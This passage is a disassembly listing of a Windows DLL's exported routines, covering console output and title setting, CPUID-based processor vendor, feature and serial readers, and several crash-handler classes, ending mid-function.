		mov	[ebp+var_10], esp
		mov	esi, ecx
		push	0
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_64]
		mov	[ebp+var_30], esi
		call	Ordinal1228
		and	[ebp+var_4], 0
		cmp	dword ptr [esi+8], 0FFFFFFFFh
		jnz	short loc_6AF3F04F
		xor	esi, esi
		jmp	loc_6AF3F159
; ---------------------------------------------------------------------------

loc_6AF3F04F:				; CODE XREF: Ordinal519+38j
		lea	ecx, [ebp+lpBuffer]
		call	sub_6AF318C3
		push	offset aCconsolewndP_3 ; "CConsoleWnd::PrintV"
		lea	ecx, [ebp+var_50]
		call	Ordinal751
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+lpBuffer]
		push	[ebp+Format]	; Format
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF31BF4
		jmp	loc_6AF3F116
; ---------------------------------------------------------------------------

loc_6AF3F07B:				; DATA XREF: .rdata:6AF62FC0o
		push	13h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	ecx, [ebp+var_54]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3F113
		retn
; ---------------------------------------------------------------------------

loc_6AF3F0BE:				; DATA XREF: .rdata:6AF62FD0o
		push	15h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	eax, [ebp+var_58]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3F113
		retn
; ---------------------------------------------------------------------------

loc_6AF3F113:				; DATA XREF: Ordinal519+AAo
					; Ordinal519+FFo
		mov	esi, [ebp+var_30]

loc_6AF3F116:				; CODE XREF: Ordinal519+68j
		lea	ecx, [ebp+var_50]
		call	Ordinal753
		test	eax, eax
		mov	edi, [ebp+lpBuffer]
		jz	short loc_6AF3F129
		xor	esi, esi
		jmp	short loc_6AF3F149
; ---------------------------------------------------------------------------

loc_6AF3F129:				; CODE XREF: Ordinal519+115j
		and	[ebp+NumberOfCharsWritten], 0
		push	0		; lpReserved
		lea	eax, [ebp+NumberOfCharsWritten]
		push	eax		; lpNumberOfCharsWritten
		push	dword ptr [edi-0Ch] ; nNumberOfCharsToWrite
		push	edi		; lpBuffer
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:WriteConsoleA
		xor	eax, eax
		cmp	eax, [ebp+NumberOfCharsWritten]
		sbb	esi, esi
		neg	esi

loc_6AF3F149:				; CODE XREF: Ordinal519+119j
		lea	ecx, [ebp+var_50]
		call	Ordinal752
		lea	ecx, [edi-10h]
		call	sub_6AF3160D

loc_6AF3F159:				; CODE XREF: Ordinal519+3Cj
		lea	ecx, [ebp+var_64]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal519	endp ; sp-analysis failed

; Exported entry 518.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal518(int, char *Format, char Args)
		public Ordinal518
Ordinal518	proc near		; CODE XREF: Ordinal504+Dp
					; Ordinal505+12p ...

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		call	Ordinal519
		retn
Ordinal518	endp

; Exported entry 504.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal504(int, char Args)
		public Ordinal504
Ordinal504	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= byte ptr  4

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aLd	; "%ld"
		push	esi		; int
		call	Ordinal518
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal504	endp

; Exported entry 505.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal505(char Args, double)
		public Ordinal505
Ordinal505	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= qword	ptr -0Ch
arg_0		= qword	ptr  4

		fld	[esp+arg_0]
		push	esi
		push	ecx
		push	ecx		; Args
		fstp	[esp+0Ch+var_C]
		mov	esi, ecx
		push	offset asc_6AF585F8 ; "%f"
		push	esi		; int
		call	Ordinal518
		add	esp, 10h
		mov	eax, esi
		pop	esi
		retn	8
Ordinal505	endp

; Exported entry 506.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal506(int, char Args)
		public Ordinal506
Ordinal506	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= byte ptr  4

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aLu	; "%lu"
		push	esi		; int
		call	Ordinal518
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal506	endp

; Exported entry 507.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal507(int, char)
		public Ordinal507
Ordinal507	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= byte ptr  4

		movsx	eax, [esp+arg_0]
		push	esi
		push	eax		; Args
		mov	esi, ecx
		push	offset aC	; "%c"
		push	esi		; int
		call	Ordinal518
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal507	endp

; Exported entry 508.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal508(int, char Args)
		public Ordinal508
Ordinal508	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= byte ptr  4

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aS	; "%s"
		push	esi		; int
		call	Ordinal518
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal508	endp

; Exported entry 527.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal527(char	*Src)
		public Ordinal527
Ordinal527	proc near		; CODE XREF: Ordinal1096+46p
					; DATA XREF: .rdata:off_6AF66098o

var_58		= byte ptr -58h
var_44		= byte ptr -44h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_69 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 4Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		push	0
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_58]
		call	Ordinal1228
		and	[ebp+var_4], 0
		push	offset aCconsolewndS_7 ; "CConsoleWnd::SetTitle"
		lea	ecx, [ebp+var_44]
		call	Ordinal751
		push	[ebp+Src]	; Src
		lea	ecx, [esi+0Ch]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D

loc_6AF3F26A:				; DATA XREF: sub_6AF3F2A4+3Do
					; sub_6AF3F2E7+4Fo
		lea	ecx, [ebp+var_44]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_44]
		inc	esi
		call	Ordinal752
		lea	ecx, [ebp+var_58]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal527	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3F2A4	proc near		; DATA XREF: .rdata:6AF63030o
		push	13h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	ecx, [ebp-4Ch]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3F26A
		retn
sub_6AF3F2A4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3F2E7	proc near		; DATA XREF: .rdata:6AF63040o
		push	15h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	eax, [ebp-48h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3F26A
		retn
sub_6AF3F2E7	endp

; Exported entry 533.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal533
Ordinal533	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5A03C
		retn
Ordinal533	endp

; Exported entry 535.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal535
Ordinal535	proc near		; DATA XREF: .rdata:off_6AF66098o
		lea	eax, [ecx+30h]
		retn
Ordinal535	endp

; Exported entry 536.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal536
Ordinal536	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+14h]
		and	eax, 0Fh
		retn
Ordinal536	endp

; Exported entry 537.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal537
Ordinal537	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+14h]
		shr	eax, 4
		and	eax, 0Fh
		retn
Ordinal537	endp

; Exported entry 538.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal538
Ordinal538	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+14h]
		shr	eax, 8
		and	eax, 0Fh
		retn
Ordinal538	endp

; Exported entry 539.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal539
Ordinal539	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+14h]
		shr	eax, 0Ch
		and	eax, 3
		retn
Ordinal539	endp

; Exported entry 540.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal540
Ordinal540	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		mov	al, [ecx+16h]
		and	eax, 0Fh
		retn
Ordinal540	endp

; Exported entry 541.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal541
Ordinal541	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+14h]
		shr	eax, 14h
		retn
Ordinal541	endp

; Exported entry 542.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal542
Ordinal542	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+18h]
		shr	eax, 12h
		and	eax, 1
		retn
Ordinal542	endp

; Exported entry 543.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal543
Ordinal543	proc near		; DATA XREF: .rdata:off_6AF66098o
		lea	eax, [ecx+3Dh]
		retn
Ordinal543	endp

; Exported entry 545.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal545
Ordinal545	proc near		; CODE XREF: Ordinal532+9Dp
					; DATA XREF: .rdata:off_6AF66098o

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset stru_6AF5A088
		call	__SEH_prolog
		mov	esi, ecx
		xor	eax, eax
		cmp	[esi+2Ch], eax
		jz	short loc_6AF3F3DB
		cmp	[esi+28h], eax
		jz	short loc_6AF3F3DB
		mov	[esi+14h], eax
		xor	edi, edi
		inc	edi
		mov	[ebp+ms_exc.disabled], eax
		mov	eax, 1
		cpuid
		mov	[ebp+var_1C], eax
		mov	eax, [ebp+var_1C]
		mov	[esi+14h], eax
		jmp	short loc_6AF3F3D3
; ---------------------------------------------------------------------------

loc_6AF3F3BF:				; DATA XREF: .rdata:stru_6AF5A088o
		xor	eax, eax	; Exception filter 0 for function 6AF3F38A
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3F3C3:				; DATA XREF: .rdata:stru_6AF5A088o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF3F38A
		push	offset aCcpuinfoLoadsi ; "CCPUInfo::LoadSignature() : __except (E"...
		call	sub_6AF3102E
		pop	ecx
		xor	edi, edi

loc_6AF3F3D3:				; CODE XREF: Ordinal545+33j
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	eax, edi
		jmp	short loc_6AF3F3DD
; ---------------------------------------------------------------------------

loc_6AF3F3DB:				; CODE XREF: Ordinal545+13j
					; Ordinal545+18j
		xor	eax, eax

loc_6AF3F3DD:				; CODE XREF: Ordinal545+4Fj
		call	__SEH_epilog
		retn
Ordinal545	endp

; Exported entry 546.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal546
Ordinal546	proc near		; CODE XREF: Ordinal532+A4p
					; DATA XREF: .rdata:off_6AF66098o

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset stru_6AF5A0E0
		call	__SEH_prolog
		mov	esi, ecx
		xor	eax, eax
		cmp	[esi+2Ch], eax
		jz	short loc_6AF3F434
		cmp	[esi+28h], eax
		jz	short loc_6AF3F434
		mov	[esi+18h], eax
		xor	edi, edi
		inc	edi
		mov	[ebp+ms_exc.disabled], eax
		mov	eax, 1
		cpuid
		mov	[ebp+var_1C], edx
		mov	eax, [ebp+var_1C]
		mov	[esi+18h], eax
		jmp	short loc_6AF3F42C
; ---------------------------------------------------------------------------

loc_6AF3F418:				; DATA XREF: .rdata:stru_6AF5A0E0o
		xor	eax, eax	; Exception filter 0 for function 6AF3F3E3
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3F41C:				; DATA XREF: .rdata:stru_6AF5A0E0o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF3F3E3
		push	offset aCcpuinfoLoadfe ; "CCPUInfo::LoadFeatures() : __except (EX"...
		call	sub_6AF3102E
		pop	ecx
		xor	edi, edi

loc_6AF3F42C:				; CODE XREF: Ordinal546+33j
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	eax, edi
		jmp	short loc_6AF3F436
; ---------------------------------------------------------------------------

loc_6AF3F434:				; CODE XREF: Ordinal546+13j
					; Ordinal546+18j
		xor	eax, eax

loc_6AF3F436:				; CODE XREF: Ordinal546+4Fj
		call	__SEH_epilog
		retn
Ordinal546	endp

; Exported entry 547.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal547
Ordinal547	proc near		; CODE XREF: Ordinal532+B5p
					; DATA XREF: .rdata:off_6AF66098o

Src		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	1Ch
		push	offset stru_6AF5A150
		call	__SEH_prolog
		mov	esi, ecx
		mov	[ebp+var_20], esi
		xor	ebx, ebx
		cmp	[esi+2Ch], ebx
		jz	loc_6AF3F50C
		cmp	[esi+28h], ebx
		jz	loc_6AF3F50C
		mov	eax, [esi+18h]
		shr	eax, 12h
		test	al, 1
		jz	loc_6AF3F50C
		lea	edi, [esi+1Ch]
		push	0Ch		; Size
		push	ebx		; Val
		push	edi		; Dst
		call	memset
		add	esp, 0Ch
		mov	[ebp+var_1C], 1
		mov	[ebp+ms_exc.disabled], ebx
		mov	eax, 1
		cpuid
		mov	[ebp+Src], eax
		mov	eax, 3
		cpuid
		mov	[ebp+var_28], edx
		mov	[ebp+var_24], ecx
		push	0Ch		; Size
		lea	eax, [ebp+Src]
		push	eax		; Src
		push	edi		; Dst
		call	memcpy
		add	esp, 0Ch
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_6AF3F4D1
; ---------------------------------------------------------------------------

loc_6AF3F4B4:				; DATA XREF: .rdata:stru_6AF5A150o
		xor	eax, eax	; Exception filter 0 for function 6AF3F43C
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3F4B8:				; DATA XREF: .rdata:stru_6AF5A150o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF3F43C
		push	offset aCcpuinfoLoadse ; "CCPUInfo::LoadSerial() : __except (EXCE"...
		call	sub_6AF3102E
		pop	ecx
		and	[ebp+var_1C], 0
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	esi, [ebp+var_20]

loc_6AF3F4D1:				; CODE XREF: Ordinal547+76j
		cmp	[ebp+var_1C], 0
		jz	short loc_6AF3F507
		movzx	eax, word ptr [esi+24h]
		push	eax
		movzx	eax, word ptr [esi+26h]
		push	eax
		movzx	eax, word ptr [esi+20h]
		push	eax
		movzx	eax, word ptr [esi+22h]
		push	eax
		movzx	eax, word ptr [esi+1Ch]
		push	eax
		movzx	eax, word ptr [esi+1Eh]
		push	eax
		push	offset a04x04x04x04x04 ; "%04X-%04X-%04X-%04X-%04X-%04X"
		add	esi, 3Dh
		push	esi		; LPSTR
		call	ds:wsprintfA
		add	esp, 20h

loc_6AF3F507:				; CODE XREF: Ordinal547+99j
		mov	eax, [ebp+var_1C]
		jmp	short loc_6AF3F50E
; ---------------------------------------------------------------------------

loc_6AF3F50C:				; CODE XREF: Ordinal547+16j
					; Ordinal547+1Fj ...
		xor	eax, eax

loc_6AF3F50E:				; CODE XREF: Ordinal547+CEj
		call	__SEH_epilog
		retn
Ordinal547	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_5. PRESS KEYPAD "+" TO EXPAND]
; Exported entry 544.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal544
Ordinal544	proc near		; CODE XREF: Ordinal532+96p
					; DATA XREF: .rdata:off_6AF66098o

var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
Src		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	24h
		push	offset stru_6AF5A1A0
		call	__SEH_prolog
		mov	eax, ___security_cookie
		mov	[ebp+var_1C], eax
		mov	esi, ecx
		mov	[ebp+var_34], esi
		xor	ebx, ebx
		cmp	[esi+2Ch], ebx
		jnz	short loc_6AF3F555
		xor	eax, eax
		jmp	short loc_6AF3F5CE
; ---------------------------------------------------------------------------

loc_6AF3F555:				; CODE XREF: Ordinal544+1Ej
		lea	edi, [esi+4]
		push	0Dh		; Size
		push	ebx		; Val
		push	edi		; Dst
		call	memset
		add	esp, 0Ch
		mov	[ebp+var_30], 1
		mov	[ebp+ms_exc.disabled], ebx
		xor	eax, eax
		cpuid
		mov	[ebp+Src], ebx
		mov	[ebp+var_28], edx
		mov	[ebp+var_24], ecx
		push	0Dh		; Size
		lea	eax, [ebp+Src]
		push	eax		; Src
		push	edi		; Dst
		call	memcpy
		add	esp, 0Ch
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_6AF3F5AD
; ---------------------------------------------------------------------------

loc_6AF3F590:				; DATA XREF: .rdata:stru_6AF5A1A0o
		xor	eax, eax	; Exception filter 0 for function 6AF3F531
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3F594:				; DATA XREF: .rdata:stru_6AF5A1A0o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF3F531
		push	offset aCcpuinfoLoadve ; "CCPUInfo::LoadVendor() : __except (EXCE"...
		call	sub_6AF3102E
		pop	ecx
		and	[ebp+var_30], 0
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	esi, [ebp+var_34]

loc_6AF3F5AD:				; CODE XREF: Ordinal544+5Dj
		cmp	[ebp+var_30], 0
		jz	short loc_6AF3F5CB
		mov	byte ptr [esi+10h], 0
		call	Target
		lea	eax, [esi+4]
		push	eax		; lpString2
		add	esi, 30h
		push	esi		; lpString1
		call	ds:lstrcpyA

loc_6AF3F5CB:				; CODE XREF: Ordinal544+80j
		mov	eax, [ebp+var_30]

loc_6AF3F5CE:				; CODE XREF: Ordinal544+22j
		mov	ecx, [ebp+var_1C]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		call	__SEH_epilog
		retn
Ordinal544	endp

; Exported entry 532.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal532
Ordinal532	proc near		; DATA XREF: .rdata:off_6AF66098o

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	10h
		push	offset stru_6AF5A1F0
		call	__SEH_prolog
		mov	esi, ecx
		mov	[ebp+var_20], esi
		mov	dword ptr [esi], offset	off_6AF5A03C
		xor	edi, edi
		mov	[esi+14h], edi
		mov	[esi+18h], edi
		mov	[esi+28h], edi
		mov	dword ptr [esi+2Ch], 1
		push	0Dh		; Size
		push	edi		; Val
		lea	eax, [esi+4]
		push	eax		; Dst
		call	memset
		push	0Dh		; Size
		push	edi		; Val
		lea	eax, [esi+30h]
		push	eax		; Dst
		call	memset
		push	0Ch		; Size
		push	edi		; Val
		lea	eax, [esi+1Ch]
		push	eax		; Dst
		call	memset
		push	1Eh		; Size
		push	edi		; Val
		lea	eax, [esi+3Dh]
		push	eax		; Dst
		call	memset
		add	esp, 30h
		mov	[ebp+ms_exc.disabled], edi
		mov	[ebp+var_1C], edi
		xor	eax, eax
		cpuid
		mov	[ebp+var_1C], eax
		mov	eax, [ebp+var_1C]
		mov	[esi+28h], eax
		jmp	short loc_6AF3F667
; ---------------------------------------------------------------------------

loc_6AF3F64D:				; DATA XREF: .rdata:stru_6AF5A1F0o
		xor	eax, eax	; Exception filter 0 for function 6AF3F5DC
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3F651:				; DATA XREF: .rdata:stru_6AF5A1F0o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF3F5DC
		push	offset aCcpuinfoCcpuin ; "CCPUInfo::CCPUInfo() : __except (EXCEPT"...
		call	sub_6AF3102E
		pop	ecx
		mov	esi, [ebp+var_20]
		xor	edi, edi
		mov	[esi+2Ch], edi

loc_6AF3F667:				; CODE XREF: Ordinal532+6Fj
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		cmp	[esi+2Ch], edi
		jz	short loc_6AF3F696
		mov	ecx, esi
		call	Ordinal544
		mov	ecx, esi
		call	Ordinal545
		mov	ecx, esi
		call	Ordinal546
		mov	eax, [esi+18h]
		shr	eax, 12h
		test	al, 1
		jz	short loc_6AF3F696
		mov	ecx, esi
		call	Ordinal547

loc_6AF3F696:				; CODE XREF: Ordinal532+92j
					; Ordinal532+B1j
		mov	eax, esi
		call	__SEH_epilog
		retn
Ordinal532	endp

; Exported entry 548.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal548
Ordinal548	proc near		; CODE XREF: Ordinal560+Ep
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal906
		mov	eax, [esp+4+arg_0]
		mov	[esi+14h], eax
		mov	dword ptr [esi], offset	off_6AF5A1FC
		mov	eax, esi
		pop	esi
		retn	4
Ordinal548	endp

; Exported entry 549.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal549
Ordinal549	proc near		; CODE XREF: sub_6AF3FB16+3p
					; Ordinal561+50j
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5A1FC
		jmp	Ordinal907
Ordinal549	endp

; Exported entry 550.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal550(char	Args)
		public Ordinal550
Ordinal550	proc near		; DATA XREF: .rdata:6AF5A200o
					; .rdata:off_6AF66098o

Args		= byte ptr  4

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aCnewcrashhandl ; "CNewCrashHandler::NewHandler() : nSize "...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	ecx, [esi+14h]
		mov	eax, [ecx]
		push	0
		push	2
		call	dword ptr [eax+4]
		push	dword ptr [esp+4+Args]
		mov	ecx, esi
		call	Ordinal910
		pop	esi
		retn	4
Ordinal550	endp

; Exported entry 551.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal551
Ordinal551	proc near		; CODE XREF: Ordinal560+17p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal745
		mov	eax, [esp+4+arg_0]
		mov	[esi+0Ch], eax
		mov	dword ptr [esi], offset	off_6AF5A234
		mov	eax, esi
		pop	esi
		retn	4
Ordinal551	endp

; Exported entry 552.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal552
Ordinal552	proc near		; CODE XREF: sub_6AF3FB32+3p
					; Ordinal561+47p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5A234
		jmp	Ordinal746
Ordinal552	endp

; Exported entry 553.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal553
Ordinal553	proc near		; DATA XREF: .rdata:6AF5A238o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		mov	eax, [edi]
		push	dword ptr [eax]	; Args
		mov	esi, ecx
		push	offset aCexceptioncras ; "CExceptionCrashHandler::ExceptionHandle"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	ecx, [esi+0Ch]
		mov	eax, [ecx]
		push	edi
		push	3
		call	dword ptr [eax+4]
		push	edi
		mov	ecx, esi
		call	Ordinal749
		pop	edi
		pop	esi
		retn	4
Ordinal553	endp

; Exported entry 554.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal554
Ordinal554	proc near		; CODE XREF: Ordinal560+20p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal982
		mov	eax, [esp+4+arg_0]
		mov	[esi+0Ch], eax
		mov	dword ptr [esi], offset	off_6AF5A284
		mov	eax, esi
		pop	esi
		retn	4
Ordinal554	endp

; Exported entry 555.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal555
Ordinal555	proc near		; CODE XREF: sub_6AF3FB4E+3p
					; Ordinal561+3Fp
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5A284
		jmp	Ordinal983
Ordinal555	endp

; Exported entry 556.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal556
Ordinal556	proc near		; DATA XREF: .rdata:6AF5A288o
					; .rdata:off_6AF66098o
		push	esi
		push	offset aCpurecallcrash ; "CPurecallCrashHandler::PurecallHandler("...
		mov	esi, ecx
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, [esi+0Ch]
		mov	eax, [ecx]
		push	0
		push	4
		call	dword ptr [eax+4]
		mov	ecx, esi
		pop	esi
		jmp	Ordinal986
Ordinal556	endp

; Exported entry 557.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal557
Ordinal557	proc near		; CODE XREF: Ordinal560+29p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1022
		mov	eax, [esp+4+arg_0]
		mov	[esi+0Ch], eax
		mov	dword ptr [esi], offset	off_6AF5A2B8
		mov	eax, esi
		pop	esi
		retn	4
Ordinal557	endp

; Exported entry 558.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal558
Ordinal558	proc near		; CODE XREF: sub_6AF3FB6A+3p
					; Ordinal561+37p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5A2B8
		jmp	Ordinal1023
Ordinal558	endp

; Exported entry 559.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal559(char	Args, int)
		public Ordinal559
Ordinal559	proc near		; DATA XREF: .rdata:6AF5A2BCo
					; .rdata:off_6AF66098o

Args		= byte ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aCsecuritycrash ; "CSecurityCrashHandler::SecurityHandler("...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	ecx, [esi+0Ch]
		mov	eax, [ecx]
		push	0
		push	5
		call	dword ptr [eax+4]
